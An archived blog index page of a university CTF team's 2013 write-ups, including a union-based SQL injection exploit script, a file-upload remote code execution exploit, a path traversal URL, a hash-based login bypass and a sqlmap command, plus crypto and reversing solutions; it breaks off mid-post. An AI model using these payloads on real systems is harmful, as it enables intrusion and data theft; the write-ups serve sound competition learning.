@@ -1,0 +1,1037 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>blue-lotus</title>
+  <meta name="author" content="blue-lotus">
+
+  
+  <meta name="description" content="PlaidCTF2013 Crypto100 crypto One of us devised a new cryptosystem! Can you break it? client.py running at 54.234.77.50:13797 or 54.235.50.140:13797 &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.blue-lotus.net/www/blog/page/5">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="blue-lotus" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">blue-lotus</a></h1>
+  
+    <h2>Security Research Team @ Tsinghua University</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:www.blue-lotus.net/www" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/plaidctf-2013-crypto100-crypto-writeup/">PlaidCTF 2013 Crypto100 Crypto Writeup</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-04-26T00:00:00+08:00" pubdate data-updated="true">Apr 26<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h3>PlaidCTF2013 Crypto100 <em>crypto</em></h3>
+
+<p>One of us devised a new cryptosystem! Can you break it?</p>
+
+<p>client.py running at 54.234.77.50:13797 or 54.235.50.140:13797.</p>
+
+<pre><code>import random
+import math
+# bleh, figuring out how to decrypt stuff is hard...
+# good thing there's a service running at 54.234.245.15 port 13797
+
+ciphertext = (19139950631257094109974817512950844945236146526899325826152393111265339856332117664760030665587057736341341088217L, 698145134021698598302443232564752607941576857199606106641450906890460571956580687935633542046758257396595842622837937744732920113344374182219623260691576508226597259307160898152603847317630021751538L, 375)
+pubkey = 914036124605072095896498645040317110444677693681625101303036515307269256964695517984683462742136579499746530214988587637694496516580350919995355407744891125814950650516684386468562425056693756001673L
+
+def numbits(k):
+    if k == 1:
+        return 1
+    return int(math.ceil(math.log(k,2))) + (1 if k % 2 == 0 else 0)
+
+def strtoint(s):
+    if len(s) == 0:
+        return 0
+    if len(s) == 1:
+        return ord(s[0])
+    return (ord(s[0]) &amp;lt;&amp;gt; 8) + c
+
+def encrypt(m, N):
+    L = numbits(m)
+    random.seed()
+    r = random.randint(2, N-1)
+    x = pow(r, 2, N)
+    y = x
+    l = 0
+    for k in range(0, L):
+        l = l * 2 #这里本来是左移，但是小于号会把后面的代码吃掉
+        l |= y &amp;amp; 1
+        y = pow(y, 2, N)
+    return (m ^ l, y, L)
+</code></pre>
+
+<hr />
+
+<p>加密的过程大致如下：<br/>
+生成随机数y，取y的二进制表示的最后一位。<br/>
+然后令y = y*y % N，不停的迭代下去。最后得到由y%1构成的一个串，长度为L，表示成数字就是l。<br/>
+最后返回密文m<sup>l</sup>, 最后一次迭代得到的r和整个串的长度L。<br/>
+如果考虑直接解密，因为不知道密钥，只能尝试将r开方。<br/>
+当N是质数时，开方至少会得到两个解。而N是两个模4余3的质数之积时，开方会有四个解。<br/>
+二进制串的长度L是375，这说明要解密375次才能得到l，枚举所有情况是不可能的。<br/>
+在没有私钥的情况下是不可解的。<br/>
+题目提示利用解密程序求解。<br/>
+但是直接将密文提交给服务器，服务器不会解密这个密文。</p>
+
+<p>slipper@bt:~/CTF/PlaidCTF2013/crypto/crypto$ telnet 54.234.245.15 13797<br/>
+Trying 54.234.245.15&#8230;<br/>
+Connected to 54.234.245.15.<br/>
+Escape character is &#8216;^]&#8217;.<br/>
+Send 1 to encrypt, 2 to decrypt, 3 to get pubkey: 2<br/>
+c: 15837612793129403265283574183712049320456923458239472034932056385412838712039129134628735129381029461924618321283<br/>
+y:9814513402169859830244323256475260794157685719960610664145090689046057195658068793563354204675825739659584262283793774432920113344374182219623260691576508226597259307160898152603847317630021751538<br/>
+L: 375<br/>
+&#8230; Nice try&#8230;</p>
+
+<p>尝试之后发现解密程序至判断y是否是698145134021698598302443232564752607941576857199606106641450906890460571956580687935633542046758257396595842622837937744732920113344374182219623260691576508226597259307160898152603847317630021751538。只要不是这个值都可以解密。<br/>
+所以只需再进行一次迭代，便可以让解密程序按照我们的想法运行。<br/>
+也就是<br/>
+y = y*y % N = 842376507373989895999086264722582537123368770490346950741353843138436241343024669185370422253938355914800459068857695521295261389627915740380085077620094827672888542982036568692912342891435425038793<br/>
+L = 375 + 1 = 376<br/>
+再次提交</p>
+
+<p>slipper@bt:~/CTF/PlaidCTF2013/crypto/crypto$ telnet 54.234.245.15 13797<br/>
+Trying 54.234.245.15&#8230;<br/>
+Connected to 54.234.245.15.<br/>
+Escape character is &#8216;^]&#8217;.<br/>
+Send 1 to encrypt, 2 to decrypt, 3 to get pubkey: 2<br/>
+c: 0<br/>
+y: 84237650737398989599908626472258253712336877049034695074135384313843624134302466918537042225393835591480045906885769552295261389627915740380085077620094827672888542982036568692912342891435425038793<br/>
+L: 376<br/>
+Here you go!<br/>
+101686897114606056715237168431190820000470796857828910395983438187233021385241214426095996035820483704909967063880</p>
+
+<p>因为解密的密文是0，所以返回的明文正是用y解密（开方）376次得到的l。<br/>
+这个l是376位，比我们需要的l长了一位。<br/>
+也就是说我们用来解密的l = l >> 1 = 50843448557303028357618584215595410000235398428914455197991719093616510692620607213047998017910241852454983531940<br/>
+将其与m异或，得到45254887930239273167431232764821063317056202877996423494141119054532192953084223271331941921852046201353001849981<br/>
+再用inttostr()，得到 &#8220;KEY{Cyprus&#95;keylength(cm)&#95;STILL&#95;BEST&#95;KEY_FORMAT}:&#8221;</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/ictf-2013-traintrain-writeup/">iCTF 2013 Traintrain Writeup</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-03-24T00:00:00+08:00" pubdate data-updated="true">Mar 24<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Traintrain is a web system written in python.</p>
+
+<p>There is a register/login page, where we can login using username/password from traintrain.ini. Then a solution page showed up, asks for a solution. Nothing special so far.</p>
+
+<p>Under the service dir, there is a sqlite3 db file detected using file commmand. Open it and execute .dump, we can get the table and data, here is a snippet:</p>
+
+<pre><code>CREATE TABLE users (username text, password text, authorization text, session text, history text, score int, assignment text, solution text);
+INSERT INTO users VALUES('johndoe','3858f62230ac3c915f300c664312c63f','ab6eff381fffea763a81b73',NULL,NULL,NULL,NULL,NULL);
+INSERT INTO users VALUES('janedoe','96948aad3fcae80c08a35c9b5958cd89','ab56a388299ef6deab12552ccc1',NULL,NULL,NULL,NULL,NULL);
+INSERT INTO users VALUES('aledivlew','fcccdf1344ad3078c2fbec2194996a08','FLGeFrCu4pF4ipCF','0d1444c3861cf373e36b24e6b5a5f785','/',NULL,NULL,NULL);
+</code></pre>
+
+<p>So the flag should be the authorization text of some users.</p>
+
+<p>The source codes are not presented in the service dir. So we decompiled the python bytecode using <a href="https://github.com/wibiti/uncompyle2">uncompyle2</a>. You can find the source code <a href="https://gist.github.com/zTrix/5230705">here</a>.</p>
+
+<p>The code is a bit complex. We read through the code thoroughly, even the generate and calculate logic. The basic idea is injection, but We come up with several ideas turned out to be useless, because the code is well protected. After some more review, we noticed that there is a function called history, and the history sql is the only one built by string concatenation rather than sqlite library protected construction. So we decided to do sql injection here.</p>
+
+<pre><code>query = "select username, score from users where history LIKE '%%%s%%' and not session='%s'" % (history, session)
+</code></pre>
+
+<p>The session variable is well checked and hard to inject, but we can control history variable, since the url path will be joined using &#8216;:&#8217; as separator to form the history string, e.g. &#8220;/:/solution&#8221;.</p>
+
+<p>Then we carefully construct a path:</p>
+
+<p>%&amp;#8217; or 1=1 union select username, authorization from users where 1=1 or &amp;#8217;:/solution%&amp;#8217;=&amp;#8217;</p>
+
+<p>which will be urlencoded to</p>
+
+<p>%25&amp;#8217;%20or%201%3D1%20union%20select%20username%2C%20authorization%20from%20users%20where%201%3D1%20or%20&amp;#8217;%3A%2Fsolution%25&amp;#8217;%3D&amp;#8217;</p>
+
+<p>Register a user and login to get a session, hit this urlpath, then it will be stored as the history string. After that, we hit &#8220;/solution&#8221; again to trigger the injected sql, and the flag string will be returned in html. So just parse out the flag and return!</p>
+
+<p>Here is the exploit code:</p>
+
+<pre><code>class Exploit():
+
+  def tt(self, ip, port, flag_id):
+    import httplib, time, urllib, random
+
+    conn = httplib.HTTPConnection(ip, port)
+    uu = random.choice('asfaasdf') + random.choice('asfaasdf') + random.choice('asfaasdf') + random.choice('asfaasdf')
+    params = urllib.urlencode({'username': uu, 'password': uu, 'authorization': uu})
+    headers = {"Content-type": "application/x-www-form-urlencoded"}
+    conn.request("POST", "/register", params, headers)
+    response = conn.getresponse()
+    header = response.getheaders()
+    data = response.read()
+    conn.close()
+
+    conn = httplib.HTTPConnection(ip, port)
+    conn.request('POST', "/login", urllib.urlencode({'username': uu, 'password': uu}), headers)
+    response = conn.getresponse()
+    header = response.getheaders()
+    data = response.read()
+    for k, v in header:
+        if k.lower() == 'set-cookie':
+            cookie = v
+    #print cookie
+    conn.close()
+    #print '--python cookie', cookie
+
+    sql = "%25\'%20or%201%3D1%20union%20select%20username%2C%20authorization%20from%20users%20where%201%3D1%20or%20\'%3A%2Fsolution%25\'%3D\'"
+    headers['cookie'] = cookie
+    conn = httplib.HTTPConnection(ip, port)
+    conn.request('POST', "/" + sql, urllib.urlencode({'username': uu, 'password': uu}), headers)
+    response = conn.getresponse()
+    header = response.getheaders()
+    data = response.read()
+    conn.close()
+    #print '--insert', len(data), data
+
+    conn = httplib.HTTPConnection(ip, port)
+    conn.request('POST', "/solution", urllib.urlencode({'solution': '1', 'assignment': '2'}), headers)
+    response = conn.getresponse()
+    header = response.getheaders()
+    data = response.read()
+    #print '--result', len(data), data
+    conn.close()
+
+    import re
+    mat = re.findall('&lt;tr&gt;&lt;td&gt;(.*?)&lt;/td&gt;.*?&lt;td&gt;(.*?)&lt;/td&gt;&lt;/tr&gt;', data)
+
+    flag = ''
+    #print mat
+    for item in mat:
+        if item[1].startswith('FLG'):
+            flag = item[1]
+        if item[0] == flag_id and item[1] != 'None':
+            return item[1]
+    return flag
+
+  def execute(self, ip, port, flag_id):
+
+    # Put your awesomeness here. You are free to import/use whatever
+    # standard Python library you want.
+
+    # Your exploit gets as parameters the IP/PORT of the service to
+    # attack. The IP is a string, the PORT is an integer.
+
+    # For some services, the "flag_id" parameter will be provided:
+    # sometimes, this is needed to specify which flag you need to
+    # steal (in case there are many on the server). If you feel you
+    # don't need to use the "flag_id" parameter, just ignore it.
+    # Still, your execute() method will always receive the "flag_id"
+    # parameter.
+
+    self.flag = self.tt(ip, port, flag_id);
+
+  def result(self):
+    return {'FLAG' : self.flag }
+</code></pre>
+
+<p>Have known above, we can easily fix the exploit by replace the string concatenation of the sql by sqlite library construction.</p>
+
+<p>Many thanks to Chao Liu who showed expert level hacking skills working with me on this problem.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/ictf-2013-curiosity-writeup/">iCTF 2013 Curiosityblogging Writeup</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-03-24T00:00:00+08:00" pubdate data-updated="true">Mar 24<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>This is a web blogging system written using nodejs.</p>
+
+<p>After some play and test, We find out that, it&#8217;s a blog posting system, people can read posts and upload posts.</p>
+
+<p>Then We carefully read through its core logic code. The code reveals that there is a &#8220;store&#8221; interface for iCTF servers to push flags to the system. And the there is a dir called &#8220;flags&#8221;, so our goal is to hack the web and capture the flags from the &#8220;flags&#8221; directory.</p>
+
+<p>Reviewing the code, we know that, when users create a post, the blogging system will first store its content in a plain text file, then store a metadata file using &#8220;.metadata&#8221; as extended filename. And the metadata file only contains the length of the post surrounded by brackets, such as &#8220;[36]&#8220;.</p>
+
+<p>Soon after that, we noted that, in &#8220;metadata.js&#8221;, it exports a function called checkfile, which do metafile checking by execute the metadata file as javascript in a new context. Haha, it&#8217;s time for us to show our <a href="http://en.wikipedia.org/wiki/Arbitrary_code_execution">RCE</a> skills!</p>
+
+<p>The solution is straightforward now. First we upload a random post to the server, say &#8220;abc&#8221;. At this time, the server will write abc and abc.metadata in the posts dir. Then we can upload a file using abc.metadata as the name, so the real metadata of the abc will be overwritten. The content of the newly uploaded abc.metadata is some javascript code, which will read file content from flags dir and store them in posts dir, say, stored as flag and flag.metadata.</p>
+
+<p>After all of above prepared, we just fire a hit to get post for abc, it will cause the abc.metadata executed, so our javascript code will store the flag in posts dir, then we can visit that post to get the flag.</p>
+
+<p>Here is the complete code for this exploit:</p>
+
+<pre><code>class Exploit():
+
+  def exploit_curiosity_blogging(self, ip, port, flag_id):
+    import httplib, time
+    conn = httplib.HTTPConnection(ip, port)
+    chunk = 'xxx' * 10
+    headers = {}
+    conn.request("POST", "/upload?name=___", chunk, headers)
+    conn.getresponse().read()
+
+    js = "    var fs = require('fs'); var content = fs.readFileSync('flags/" 
+        + flag_id 
+        + "'); fs.writeFileSync('posts/zzz', content); fs.writeFileSync('posts/zzz.metadata', '[' + content.length + ']'); "
+    conn = httplib.HTTPConnection(ip, port)
+    conn.request("POST", "/upload?name=___.metadata", js, headers)
+    conn.getresponse().read()
+
+    conn = httplib.HTTPConnection(ip, port)
+    conn.request("GET", "/read?id=___")
+    response = conn.getresponse()
+    s = response.read()
+
+    conn = httplib.HTTPConnection(ip, port)
+    conn.request("GET", "/read?id=zzz")
+    response = conn.getresponse()
+    s = response.read()
+    index = s.find('&lt;p&gt;')
+    index2 = s.find('&lt;/p&gt;')
+    s = s[index + 3: index2].strip()
+    ary = s.split('\n')
+    if len(ary) &amp;gt; 1:
+      return ary[1]
+    else:
+      return ''
+
+  def execute(self, ip, port, flag_id):
+    self.flag = self.exploit_curiosity_blogging(ip, port, flag_id);
+
+  def result(self):
+    return {'FLAG' : self.flag }
+</code></pre>
+
+<p>Knowing the exploit, it&#8217;s easy now to fix. The best way is to modify the checkfile function in metadata.js to remove the <a href="http://en.wikipedia.org/wiki/Arbitrary_code_execution">RCE</a> problem. Actually we fix this problem by disable uploading of posts end with &#8220;.metadata&#8221;, in this way we only need to modify one line, but may be less secure.</p>
+
+<p>Many thanks to Chao Liu who showed expert level hacking skills working with me, he inspired me with ideas, and helped me write the exploit code.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/codegate2013-web500-writeup/">Codegate2013 Web500 Writeup</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-03-06T00:00:00+08:00" pubdate data-updated="true">Mar 6<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h1>Web500</h1>
+
+<p><em>yuzeming@gmail.com</em></p>
+
+<p>网站修改user-agant后才可以查看。</p>
+
+<p>在网页源代码中发现一个加密的javascript<a href="http://58.229.122.16:33445/site/main.js">(连接)</a><br/>
+这个文件可以使用Chrome 的调试功能进行解密。</p>
+
+<p>解密后发现当我们需要访问某个页面都会通过这个JS中的load_page()函数进行加载。</p>
+
+<pre><code>function load_page(p){
+    var page = "home.html";
+    switch (p) {
+        case 1 : page="home.html"; break;
+        case 2 : page="introduce.html"; break;
+        case 3 : page="get_tag.html"; break;
+    }
+    window.location.href="index.php?p="+page+"&amp;s="+calcSHA1(page+"Ace in the Hole");
+}
+</code></pre>
+
+<p>猜想index.php中有一个读取文件的函数，当参数p与s相对应。php就会把这个文件读取出来。<br/>
+尝试读取一下index.php本身。读取出来的主要代码如下。</p>
+
+<pre><code>&lt;?php
+session_start();
+$mobile_agent = '/(iPod|iPhone|Android|BlackBerry|SymbianOS|SCH-M\d+|Opera Mini|Windows CE|Nokia|SonyEricsson|webOS|PalmOS)/';
+if(!preg_match($mobile_agent, $_SERVER['HTTP_USER_AGENT'])) {
+   die('mobile only...');
+}
+if (!isset($_GET['p'])){ $page = "home.html"; $sum = sha1($page."Ace in the Hole"); }else{ $page = $_GET['p']; $sum = $_GET['s'];}
+function load_page($page, $sum){
+    if ($sum != sha1($page."Ace in the Hole")) {
+        $page = "home.html";
+    }
+    return file_get_contents("./".$page);
+}
+?&gt;
+&lt;?php echo load_page($page, $sum); ?&gt;
+</code></pre>
+
+<p>的确可以读取任意文件，再尝试读取simulator.php</p>
+
+<pre><code>&lt;?php
+    session_start();
+    if (!isset($_SESSION['scrap']) &amp;&amp; !isset($_POST['name'])) die("scrap name is empty..");
+    if ($_POST['name'] == "GM") die("you can not view&amp;amp;save with 'GM'");
+    if (isset($_POST['name'])) $_SESSION['scrap']=$_POST['name'];
+    $db = sqlite_open("/var/game_db/gamesim_".$_SESSION['scrap'].".db");
+    $row = sqlite_fetch_array(sqlite_query($db,"select 1 from sqlite_master"));
+    if (isset($row[0])) {
+        $row = sqlite_fetch_array(sqlite_query($db,"select * from status left join memo on status.time = memo.time order by status.time desc limit 1;"));
+    }
+?&gt;
+
+&lt;?php if (isset($row[0])) echo gzuncompress($row['memo.memo']); ?&gt;
+</code></pre>
+
+<p>看到程序对GM的数据进行了保护。那么我们可以尝试绕过这个保护。<br/>
+不需要执行注入，可以直接下载这个/var/game_db/gamesim_GM.db文件。尝试使用../来跳转。</p>
+
+<p>最后通过这个连接，可以下载到这个数据文件</p>
+
+<p><code>http://58.229.122.16:33445/site/index.php?p=../../../var/game_db/gamesim_GM.db&amp;s=858497733a79dbc8bddd5f3f6b0fa8d0adf70049</code><br/>
+这是一个Sqlite 2.1格式的数据库文件 。<br/>
+使用Sqlite官网上的管理器打开就可以读取了。<br/>
+注意读取出来的数据是经过压缩的。</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/codegate2013-web100-writeup/">Codegate2013 Web100 Writeup</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-03-06T00:00:00+08:00" pubdate data-updated="true">Mar 6<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h1>Web100</h1>
+
+<p><em>yuzeming@gmail.com</em></p>
+
+<p>一个登陆页面，需要以admin登录。<br/>
+核心代码如下</p>
+
+<pre><code>&lt;?php
+$ps = mysql_real_escape_string($ps);
+$ps = hash("whirlpool",$ps, true);
+$result = mysql_query("select * from users where user_id='$id' and user_ps='$ps'");
+?&gt;
+</code></pre>
+
+<p>可以注意到hash函数的第三个参数为true，使得hash函数返回的是二进制串。任何字符都可能出现在字符串内。<br/>
+如果<code>'='</code>出现在hash后的字符串内可能导致注入。</p>
+
+<p>原理是当这个字符串带入查询后，查询串为<code>where user_ps='XXXX'='YYY'</code>。</p>
+
+<ul>
+<li>第一步运算 <code>user_ps='XXXX'</code>得到一个int值。由于不相等应该等于0.</li>
+<li>第二步运算 int值与字符串比较，会把字符串转换为int，转换结果也等于0。</li>
+</ul>
+
+
+<p>这绕过了密码检验。</p>
+
+<p>可以使用admin/364383登录这个系统。</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/codegate-preliminary-2013-binary-100-writeup/">Codegate Preliminary 2013 Binary 100 Writeup</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-03-06T00:00:00+08:00" pubdate data-updated="true">Mar 6<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>We got 8938765cdf97403089c008e4d4b63d52.exe, which is a .Net program. It asks for a series of numbers, and we could reasonably guess that the flag will be shown if we input the correct key.</p>
+
+<p>By using Reflector, we found that this assembly is obfuscated. But the good news is that only a few portion is obfuscated. Looking around the disassembled code, we found something interesting:</p>
+
+<pre><code>public void TransFormable(string Data)
+{
+    if (Data.Length == 0x10)
+    {
+        if (this.xorToString(AESCrypt.Encrypt(this.r.Text, KeyValue)) == this.lowkey)
+        {
+            MessageBox.Show(AESCrypt.Decrypt(this.StringToXOR(this.a.ByteTostring_t(this.c)), KeyValue));
+        }
+        else
+        {
+            MessageBox.Show("Do you know ?  " + AESCrypt.Decrypt(this.StringToXOR(this.a.ByteTostring_t(this.d)), KeyValue));
+        }
+    }
+}
+</code></pre>
+
+<p>Knowing that <em>this.r</em> is the TextBox, the logic of this part of code could be: checking if the encryption result of our input equals to <em>this.lowkey</em>. If they are equal, <em>this.c</em> will be decrypted and prompted (that should be the flag!). Alright, then let&#8217;s try decrypting <em>this.c</em>. Create a new .Net project in Visual Studio, copy necessary data and methods to that project and decrypt that array. Luckily, we got the flag: <strong>code9ate2013 Start</strong>.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/codegate-2013-bin-300-writeup/">Codegate 2013 Bin 300 Writeup</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-03-05T00:00:00+08:00" pubdate data-updated="true">Mar 5<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Bin300 is a win32 EXE, run it like this:</p>
+
+<p><a href="http://www.blue-lotus.net/wp-content/uploads/2013/03/bin300.png"><img src="http://www.blue-lotus.net/wp-content/uploads/2013/03/bin300.png" alt="" width="245" height="113" class="aligncenter size-full wp-image-393" /></a></p>
+
+<p>It seems like need a password.</p>
+
+<p>At 004029c0, wo found the password checking.</p>
+
+<p><a href="http://www.blue-lotus.net/wp-content/uploads/2013/03/passchk.png"><img src="http://www.blue-lotus.net/wp-content/uploads/2013/03/passchk.png" alt="" width="615" height="97" class="aligncenter size-full wp-image-394" /></a></p>
+
+<p>Just brute jump out of the checking, the function then released a file named “8c12…..exe.unprotected.exe”.</p>
+
+<p>The file is stored in the end of the Bin300.</p>
+
+<p><a href="http://www.blue-lotus.net/wp-content/uploads/2013/03/eof.png"><img src="http://www.blue-lotus.net/wp-content/uploads/2013/03/eof.png" alt="" width="380" height="74" class="aligncenter size-full wp-image-395" /></a></p>
+
+<p>Launch the unprotected EXE but we get the alert:</p>
+
+<p><a href="http://www.blue-lotus.net/wp-content/uploads/2013/03/err.png"><img src="http://www.blue-lotus.net/wp-content/uploads/2013/03/err.png" alt="" width="572" height="162" class="aligncenter size-full wp-image-396" /></a></p>
+
+<p>Check the PE header, we found the Version Setting is 7.1, and then correct it to 5.1.</p>
+
+<p><a href="http://www.blue-lotus.net/wp-content/uploads/2013/03/ver.png"><img src="http://www.blue-lotus.net/wp-content/uploads/2013/03/ver.png" alt="" width="271" height="59" class="aligncenter size-full wp-image-397" /></a></p>
+
+<p>As the CodeGate give the hint:</p>
+
+<p>[Bin 300 Hint] Routine that makes the &#8220;Note&#8221;</p>
+
+<p>[Bin 300 Hint2] Find out notes that are created in somewhere where is not 1,2,3 difficulty level,</p>
+
+<p>We found the routine which makes the “Note”:</p>
+
+<p><a href="http://www.blue-lotus.net/wp-content/uploads/2013/03/makenotes.png"><img src="http://www.blue-lotus.net/wp-content/uploads/2013/03/makenotes.png" alt="" width="509" height="166" class="aligncenter size-full wp-image-398" /></a></p>
+
+<p><a href="http://www.blue-lotus.net/wp-content/uploads/2013/03/default.png"><img src="http://www.blue-lotus.net/wp-content/uploads/2013/03/default.png" alt="" width="530" height="256" class="aligncenter size-full wp-image-399" /></a></p>
+
+<p>After case 1,2,3, there is a default case, where the GraphBuffer2 is filled from note_default. It must be noted that there are 2 graph buffers.</p>
+
+<p><a href="http://www.blue-lotus.net/wp-content/uploads/2013/03/graph_buff1.png"><img src="http://www.blue-lotus.net/wp-content/uploads/2013/03/graph_buff1.png" alt="" width="358" height="67" class="aligncenter size-full wp-image-405" /></a><br/>
+In other cases, the GraphBuffer1 is filled. And the GraphBuffer1 is the actual output buffer.</p>
+
+<p>We launch the program in OllyDbg, at the “switch” point we modify the “Difficulty” to 4(or any other value but not 1,2,3) then the “case default” can be covered.</p>
+
+<p>At the “case default”, modify the code “pOutGraph = pGraphLine2&#95;1 &#8211; 1;” into “pOutGraph = pGraphLine &#8211; 1;” to change the output buffer to GraphBuffer1. At the asm level, it’s change the “mov ecx, [ebp+pGraphLine2&#95;1]” into “lea ecx, [edi]”.</p>
+
+<p><a href="http://www.blue-lotus.net/wp-content/uploads/2013/03/out.png"><img src="http://www.blue-lotus.net/wp-content/uploads/2013/03/out.png" alt="" width="369" height="109" class="aligncenter size-full wp-image-400" /></a></p>
+
+<p>F9……</p>
+
+<p>Wow, the flag is printed.</p>
+
+<p>EYE IS PRECIOUS</p>
+
+<p><a href="http://www.blue-lotus.net/wp-content/uploads/2013/03/graph.png"><img src="http://www.blue-lotus.net/wp-content/uploads/2013/03/graph.png" alt="" width="480" height="443" class="aligncenter size-full wp-image-401" /></a></p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/codegate2013-web300-writeup/">Codegate2013 Web300 Writeup</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-03-04T00:00:00+08:00" pubdate data-updated="true">Mar 4<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>This problem first presents a letter, in which the author asks Sherlock to find someone related to hacking case. The letter gives a blog address as clue to find the wanted one.</p>
+
+<p>By analyzing the blog js code we found the js/secret.js rather suspicious. By unpacking and decrypting it we get the following code:</p>
+
+<pre><code>eval $(document).ready(function(){var cnt=0;$('a.S').click(function(){cnt++;if(cnt==10)   {$('#popup').bPopup({contentContainer:'.content',loadUrl:'./d56b699830e77ba53855679cb1d252da.php'});cnt=0}})});
+</code></pre>
+
+<p>, which discloses a secret login page url: <a href="http://58.229.122.17:2218/d56b699830e77ba53855679cb1d252da.php">http://58.229.122.17:2218/d56b699830e77ba53855679cb1d252da.php</a> (md5 of &#8220;login&#8221;). It can be accessed by clicking ten times on &#8220;Grey&#8221; logo.</p>
+
+<p>Then we find a post form at <a href="http://58.229.122.17:2218/contact.php,">http://58.229.122.17:2218/contact.php,</a> we use sqlmap to identify if there is possibility of sqli. Luckily there is.</p>
+
+<pre><code>python sqlmap.py -u "http://58.229.122.17:2218/contact.php" --data="your_name=1&amp;amp;your_email=1@1.com&amp;amp;question=2&amp;amp;your_message=1&amp;amp;contact_submitted=send"
+</code></pre>
+
+<p>sqlmap identifies time-based blind sqli on parameter &#8220;question&#8221;. We then try to dump possible databases. Time-based blind sqli is slow and sensitive to network traffic load, so remember not to press your network connection when do time-based blind sqli.</p>
+
+<p>Databases &#8220;the_grey&#8221; is found, with two table &#8211; &#8220;contact&#8221; and &#8220;user&#8221;. &#8220;user&#8221; contains three columns &#8220;no&#8221;, &#8220;id&#8221;, md5 &#8220;password&#8221; and five rows. Using this information we login the blog and in page <a href="http://58.229.122.17:2218/my_page.php?user=victor">http://58.229.122.17:2218/my_page.php?user=victor</a> we get the one who intend to hack Hound Co.,Ltd. and time the company is hacked.</p>
+
+<p>That&#8217;s the key.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/codegate-2013-web-200/">Codegate 2013 Web 200 Writeup</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-03-04T00:00:00+08:00" pubdate data-updated="true">Mar 4<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>In Web 200, The site contains the login form for get ID and PS. ID is the IP-adress.</p>
+
